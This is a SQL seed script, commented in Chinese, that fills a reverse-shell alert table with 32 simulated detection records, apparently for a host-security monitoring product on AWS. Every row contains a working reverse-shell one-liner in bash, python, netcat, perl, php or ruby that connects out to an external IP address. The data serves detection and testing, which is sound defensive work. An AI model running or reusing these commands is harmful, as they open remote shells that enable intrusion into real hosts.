-- =====================================================
-- 模拟数据: alert_reverse_shell (反弹Shell告警表)
-- 数据量: 32条
-- 说明: AWS ap-southeast-1 (Singapore) 区域 EC2 实例
-- VPC CIDR: 10.0.0.0/16
-- shell_type: bash/python/nc/perl/php/ruby
-- =====================================================

INSERT INTO alert_reverse_shell (agent_id, host_id, host_name, victim_ip, command_line, shell_type, target_host, target_port, status, event_time, created_at, updated_at) VALUES
-- bash反弹Shell
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 'bash -i >& /dev/tcp/45.33.32.156/4444 0>&1', 'bash', '45.33.32.156', 4444, 0, NOW() - INTERVAL '30 minutes', NOW() - INTERVAL '30 minutes', NOW()),
('agent-002-e5f6g7h8', 2, 'aws-web-02', '10.0.1.11', '/bin/bash -c "bash -i >& /dev/tcp/185.220.101.35/8080 0>&1"', 'bash', '185.220.101.35', 8080, 0, NOW() - INTERVAL '2 hours', NOW() - INTERVAL '2 hours', NOW()),
('agent-005-q7r8s9t0', 5, 'aws-gateway-01', '10.0.1.30', 'exec 5<>/dev/tcp/91.121.87.18/443;cat <&5 | while read line; do $line 2>&5 >&5; done', 'bash', '91.121.87.18', 443, 1, NOW() - INTERVAL '6 hours', NOW() - INTERVAL '6 hours', NOW()),
('agent-017-m5n6o7p8', 17, 'aws-es-02', '10.0.3.31', '0<&196;exec 196<>/dev/tcp/45.155.205.233/9001;sh <&196 >&196 2>&196', 'bash', '45.155.205.233', 9001, 0, NOW() - INTERVAL '1 hour', NOW() - INTERVAL '1 hour', NOW()),
('agent-023-k9l0m1n2', 25, 'aws-eks-master-01', '10.0.4.10', 'bash -c "sh -i >& /dev/tcp/103.25.61.114/7777 0>&1"', 'bash', '103.25.61.114', 7777, 1, NOW() - INTERVAL '1 day', NOW() - INTERVAL '1 day', NOW()),

-- python反弹Shell
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 'python3 -c ''import socket,subprocess,os;s=socket.socket();s.connect(("45.143.220.115",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''', 'python', '45.143.220.115', 4444, 0, NOW() - INTERVAL '45 minutes', NOW() - INTERVAL '45 minutes', NOW()),
('agent-018-q9r0s1t2', 18, 'aws-es-03', '10.0.3.32', 'python -c ''import socket,os,pty;s=socket.socket();s.connect(("185.156.73.54",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")''', 'python', '185.156.73.54', 8888, 0, NOW() - INTERVAL '3 hours', NOW() - INTERVAL '3 hours', NOW()),
('agent-028-e9f0g1h2', 30, 'aws-jenkins-01', '10.0.5.10', 'python3 -c ''import os,pty,socket;s=socket.socket();s.connect(("61.177.173.25",5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")''', 'python', '61.177.173.25', 5555, 1, NOW() - INTERVAL '8 hours', NOW() - INTERVAL '8 hours', NOW()),
('agent-050-o7p8q9r0', 50, 'aws-vault-01', '10.0.7.20', 'python -c ''exec("""import socket,subprocess;s=socket.socket();s.connect(("91.240.118.172",6666));subprocess.call(["/bin/bash","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())""")''', 'python', '91.240.118.172', 6666, 2, NOW() - INTERVAL '2 days', NOW() - INTERVAL '2 days', NOW()),
('agent-035-g7h8i9j0', 37, 'aws-elk-01', '10.0.6.12', 'python3 -c ''import socket,subprocess,os;s=socket.socket();s.connect(("103.74.192.18",4443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])''', 'python', '103.74.192.18', 4443, 0, NOW() - INTERVAL '5 hours', NOW() - INTERVAL '5 hours', NOW()),

-- nc (Netcat)反弹Shell
('agent-003-i9j0k1l2', 3, 'aws-api-01', '10.0.1.20', 'nc -e /bin/bash 45.33.32.156 4444', 'nc', '45.33.32.156', 4444, 0, NOW() - INTERVAL '1 hour', NOW() - INTERVAL '1 hour', NOW()),
('agent-006-u1v2w3x4', 6, 'aws-app-01', '10.0.2.10', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 185.220.100.252 8080 >/tmp/f', 'nc', '185.220.100.252', 8080, 0, NOW() - INTERVAL '4 hours', NOW() - INTERVAL '4 hours', NOW()),
('agent-011-o1p2q3r4', 11, 'aws-mysql-01', '10.0.3.10', 'nc 103.74.192.18 9999 -e /bin/sh', 'nc', '103.74.192.18', 9999, 0, NOW() - INTERVAL '2 hours', NOW() - INTERVAL '2 hours', NOW()),
('agent-019-u3v4w5x6', 19, 'aws-kafka-01', '10.0.3.40', 'mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 45.227.255.99 7890 1>/tmp/backpipe', 'nc', '45.227.255.99', 7890, 1, NOW() - INTERVAL '12 hours', NOW() - INTERVAL '12 hours', NOW()),
('agent-042-i5j6k7l8', 44, 'aws-mail-01', '10.0.7.14', 'nc.traditional -e /bin/bash 222.186.30.112 1234', 'nc', '222.186.30.112', 1234, 0, NOW() - INTERVAL '5 hours', NOW() - INTERVAL '5 hours', NOW()),
('agent-044-q3r4s5t6', 46, 'aws-proxy-01', '10.0.7.16', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 103.25.61.114 5555 >/tmp/f', 'nc', '103.25.61.114', 5555, 0, NOW() - INTERVAL '3 hours', NOW() - INTERVAL '3 hours', NOW()),

-- perl反弹Shell
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 'perl -e ''use Socket;$i="45.33.32.156";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")''', 'perl', '45.33.32.156', 4444, 0, NOW() - INTERVAL '90 minutes', NOW() - INTERVAL '90 minutes', NOW()),
('agent-007-y5z6a7b8', 7, 'aws-app-02', '10.0.2.11', 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"185.161.248.12:8443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>''', 'perl', '185.161.248.12', 8443, 1, NOW() - INTERVAL '10 hours', NOW() - INTERVAL '10 hours', NOW()),
('agent-046-y1z2a3b4', 48, 'aws-ftp-01', '10.0.7.18', 'perl -e ''use Socket;socket(S,2,1,0);connect(S,pack_sockaddr_in(5555,inet_aton("103.153.78.45")));open(STDIN,">&S");open(STDOUT,">&S");exec("/bin/sh")''', 'perl', '103.153.78.45', 5555, 0, NOW() - INTERVAL '6 hours', NOW() - INTERVAL '6 hours', NOW()),

-- php反弹Shell
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 'php -r ''$sock=fsockopen("45.33.32.156",4444);exec("/bin/sh -i <&3 >&3 2>&3");''', 'php', '45.33.32.156', 4444, 0, NOW() - INTERVAL '20 minutes', NOW() - INTERVAL '20 minutes', NOW()),
('agent-002-e5f6g7h8', 2, 'aws-web-02', '10.0.1.11', 'php -r ''$sock=fsockopen("185.220.101.35",8080);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);''', 'php', '185.220.101.35', 8080, 0, NOW() - INTERVAL '3 hours', NOW() - INTERVAL '3 hours', NOW()),
('agent-005-q7r8s9t0', 5, 'aws-gateway-01', '10.0.1.30', 'php -r ''$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,"91.121.87.18",443);$p=proc_open("/bin/sh",array(array("pipe","r"),array("pipe","w"),array("pipe","w")),$pp);''', 'php', '91.121.87.18', 443, 1, NOW() - INTERVAL '1 day', NOW() - INTERVAL '1 day', NOW()),
('agent-017-m5n6o7p8', 17, 'aws-es-02', '10.0.3.31', 'php -r ''exec("/bin/bash -c \"bash -i >& /dev/tcp/45.155.205.233/9001 0>&1\"");''', 'php', '45.155.205.233', 9001, 0, NOW() - INTERVAL '4 hours', NOW() - INTERVAL '4 hours', NOW()),

-- ruby反弹Shell
('agent-018-q9r0s1t2', 18, 'aws-es-03', '10.0.3.32', 'ruby -rsocket -e ''f=TCPSocket.open("185.156.73.54",8888).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)''', 'ruby', '185.156.73.54', 8888, 0, NOW() - INTERVAL '2 hours', NOW() - INTERVAL '2 hours', NOW()),
('agent-049-k3l4m5n6', 49, 'aws-consul-01', '10.0.3.72', 'ruby -rsocket -e''c=TCPSocket.new("61.177.173.25",7777);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end''', 'ruby', '61.177.173.25', 7777, 1, NOW() - INTERVAL '8 hours', NOW() - INTERVAL '8 hours', NOW()),
('agent-028-e9f0g1h2', 30, 'aws-jenkins-01', '10.0.5.10', 'ruby -rsocket -e ''exit if fork;c=TCPSocket.new("103.25.61.114",9999);loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444 (.*)/ ? IO.popen("#{$1}","r"){|io|c.print io.read}:$_)}''', 'ruby', '103.25.61.114', 9999, 0, NOW() - INTERVAL '5 hours', NOW() - INTERVAL '5 hours', NOW()),

-- bash/python反弹Shell (跨层攻击)
('agent-037-o5p6q7r8', 39, 'aws-alertmanager-01', '10.0.6.14', 'bash -i >& /dev/tcp/45.33.32.156/4444 0>&1', 'bash', '45.33.32.156', 4444, 0, NOW() - INTERVAL '1 hour', NOW() - INTERVAL '1 hour', NOW()),
('agent-038-s9t0u1v2', 40, 'aws-vpn-01', '10.0.7.10', 'python3 -c ''import socket,subprocess,os;s=socket.socket();s.connect(("185.220.101.35",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])''', 'python', '185.220.101.35', 80, 0, NOW() - INTERVAL '3 hours', NOW() - INTERVAL '3 hours', NOW()),
('agent-039-w3x4y5z6', 41, 'aws-bastion-01', '10.0.7.11', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 91.240.118.172 443 >/tmp/f', 'nc', '91.240.118.172', 443, 0, NOW() - INTERVAL '6 hours', NOW() - INTERVAL '6 hours', NOW()),
('agent-040-a7b8c9d0', 42, 'aws-dns-01', '10.0.7.12', 'perl -e ''use Socket;$i="45.143.220.115";$p=8443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")''', 'perl', '45.143.220.115', 8443, 0, NOW() - INTERVAL '30 minutes', NOW() - INTERVAL '30 minutes', NOW()),
('agent-041-e1f2g3h4', 43, 'aws-nfs-01', '10.0.7.13', 'python -c ''import os,pty,socket;s=socket.socket();s.connect(("185.156.73.54",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")''', 'python', '185.156.73.54', 9999, 1, NOW() - INTERVAL '1 day', NOW() - INTERVAL '1 day', NOW()),
('agent-033-y9z0a1b2', 35, 'aws-prometheus-01', '10.0.6.10', 'bash -c "sh -i >& /dev/tcp/222.186.30.112/6789 0>&1"', 'bash', '222.186.30.112', 6789, 0, NOW() - INTERVAL '7 hours', NOW() - INTERVAL '7 hours', NOW());
